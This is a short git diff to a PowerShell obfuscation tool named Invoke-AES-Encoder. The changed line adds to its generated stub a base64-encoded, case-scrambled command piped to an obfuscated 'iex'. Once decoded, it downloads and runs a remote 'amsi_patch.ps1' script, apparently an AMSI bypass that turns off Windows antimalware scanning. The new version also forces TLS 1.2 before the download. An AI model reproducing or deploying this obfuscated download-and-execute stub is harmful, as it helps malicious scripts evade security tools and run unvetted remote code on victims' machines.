@@ -223,7 +223,7 @@ function Invoke-AES-Encoder {
 
             $stub_template = ''
             $code_alternatives  = @()
-			$code_alternatives += '([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("aWV4IChpd3IgImh0dHBzOi8vZ2l0aHViLmNvbS9DaGFpbnNraS9BRVMtRW5jb2Rlci9yYXcvbWFpbi9hbXNpX3BhdGNoLnBzMSIgLXVzZWIp")))|i`e`x' + "`r`n"
+            $code_alternatives += '([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjtpZXggKGl3ciAiaHR0cHM6Ly9naXRodWIuY29tL0NoYWluc2tpL0FFUy1FbmNvZGVyL3Jhdy9tYWluL2Ftc2lfcGF0Y2gucHMxIiAtdXNlYikNCg==")))|i`e`x' + "`r`n"
             $code_alternatives += '${43} = [text.encoDiNg]::"uT`F`8".GetBYtES("{42}")' + "`r`n"
             $code_alternatives += '${44} = [tEXt.enCODINg]::"uT`F`8".gEtSTrinG([ConverT]::fRoMBasE64strIng("{0}"))' + "`r`n"
             $code_alternatives += '${45} = [TeXT.EnCodiNg]::"uT`F`8".GETBYTES(${44})' + "`r`n"
